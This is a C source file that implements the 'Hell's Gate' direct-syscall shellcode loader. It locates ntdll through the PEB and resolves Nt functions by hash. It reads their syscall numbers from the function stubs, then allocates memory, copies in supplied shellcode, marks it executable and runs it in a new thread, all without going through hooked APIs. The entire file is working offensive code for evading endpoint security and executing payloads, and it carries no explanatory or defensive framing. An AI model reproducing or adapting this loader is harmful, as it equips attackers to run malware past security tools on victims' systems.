#pragma once
#define SUCCESS 0x00
#define FAIL 0x01

#include <Windows.h>
#include "hells_gate_struct.h"
#include "hells_gate_core.h"

typedef struct VX_TABLE_ENTRY {
    PVOID pAddress;
    DWORD64 dwHash;
    WORD wSystemCall;
} VX_TABLE_ENTRY, *PVX_TABLE_ENTRY;

typedef struct VX_TABLE {
    VX_TABLE_ENTRY NtAllocateVirtualMemory;
    VX_TABLE_ENTRY NtProtectVirtualMemory;
    VX_TABLE_ENTRY NtCreateThreadEx;
    VX_TABLE_ENTRY NtWaitForSingleObject;
} VX_TABLE, *PVX_TABLE;

PTEB RtlGetThreadEnvironmentBlock();

BOOL GetImageExportDirectory(
        _In_ PVOID pModuleBase,
        _Out_ PIMAGE_EXPORT_DIRECTORY *ppImageExportDirectory
);

BOOL GetVxTableEntry(
        _In_ PVOID pModuleBase,
        _In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
        _In_ PVX_TABLE_ENTRY pVxTableEntry
);

BOOL Payload(
        _In_ PVX_TABLE pVxTable,
        _In_ const unsigned char shellcode[],
        _In_ size_t size,
        _In_ boolean nativeDebug
);

PVOID VxMoveMemory(
        _Inout_ PVOID dest,
        _In_    const PVOID src,
        _In_    SIZE_T len
);

extern VOID HellsGate(WORD wSystemCall);

extern HellDescent();

INT HELLS_GATE_MAIN(unsigned char *shellcode, size_t size, boolean nativeDebug) {
    PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
        return FAIL;
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY) (
            (PBYTE) pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(pLdrDataEntry->DllBase,
                                 &pImageExportDirectory) || pImageExportDirectory == NULL)
        return FAIL;
    VX_TABLE Table = {0};
    Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                         &Table.NtAllocateVirtualMemory))
        return FAIL;
    Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                         &Table.NtCreateThreadEx))
        return FAIL;
    Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory,
                         &Table.NtProtectVirtualMemory))
        return FAIL;
    Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
    if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
        return FAIL;
    Payload(&Table, shellcode, size, nativeDebug);
    return SUCCESS;
}

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
    return (PTEB) __readgsqword(0x30);
#else
    return (PTEB)__readfsdword(0x16);
#endif
}

DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x7734773477347734;
    INT c;
    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;
    return dwHash;
}

BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY *ppImageExportDirectory) {
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER) pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS) ((PBYTE) pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE) pModuleBase +
                                                         pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions = (PDWORD) ((PBYTE) pModuleBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD) ((PBYTE) pModuleBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinals = (PWORD) ((PBYTE) pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR) ((PBYTE) pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE) pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinals[cx]];
        if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
            pVxTableEntry->pAddress = pFunctionAddress;
            WORD cw = 0;
            while (TRUE) {
                if (*((PBYTE) pFunctionAddress + cw) == 0x0f && *((PBYTE) pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;
                if (*((PBYTE) pFunctionAddress + cw) == 0xc3)
                    return FALSE;
                if (*((PBYTE) pFunctionAddress + cw) == 0x4c
                    && *((PBYTE) pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE) pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE) pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE) pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE) pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE) pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE) pFunctionAddress + 4 + cw);
                    pVxTableEntry->wSystemCall = (high << 8) | low;
                    break;
                }
                cw++;
            }
        }
    }
    return TRUE;
}

BOOL Payload(PVX_TABLE pVxTable, const unsigned char *code, size_t size, boolean nativeDebug) {
    NTSTATUS status;
    char *shellcode = (char *) malloc(size);
    for (int i = 0; i < size; i++) {
        shellcode[i] = (char) code[i];
    }
    PVOID lpAddress = NULL;
    HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE) -1, &lpAddress, 0, &size, MEM_COMMIT, PAGE_READWRITE);
    if (nativeDebug) {
        printf("[+] allocate memory for the shellcode: %ld\n", status);
    }
    VxMoveMemory(lpAddress, shellcode, size);
    if (nativeDebug) {
        printf("[+] write memory\n");
    }
    ULONG ulOldProtect = 0;
    HellsGate(pVxTable->NtProtectVirtualMemory.wSystemCall);
    status = HellDescent((HANDLE) -1, &lpAddress, &size, PAGE_EXECUTE_READ, &ulOldProtect);
    if (nativeDebug) {
        printf("[+] change page permissions: %ld\n", status);
    }
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    HellsGate(pVxTable->NtCreateThreadEx.wSystemCall);
    status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE) -1, (LPTHREAD_START_ROUTINE) lpAddress,
                         NULL, FALSE, NULL, NULL, NULL, NULL);
    if (nativeDebug) {
        printf("[+] create thread: %ld\n", status);
    }
    LARGE_INTEGER Timeout;
    Timeout.QuadPart = -10000000;
    HellsGate(pVxTable->NtWaitForSingleObject.wSystemCall);
    status = HellDescent(hHostThread, FALSE, &Timeout);
    if (nativeDebug) {
        printf("[+] wait: %ld\n", status);
    }
    return TRUE;
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
    char *d = dest;
    char *s = src;
    if (d < s)
        while (len--)
            *d++ = *s++;
    else {
        char *lasts = s + (len - 1);
        char *lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}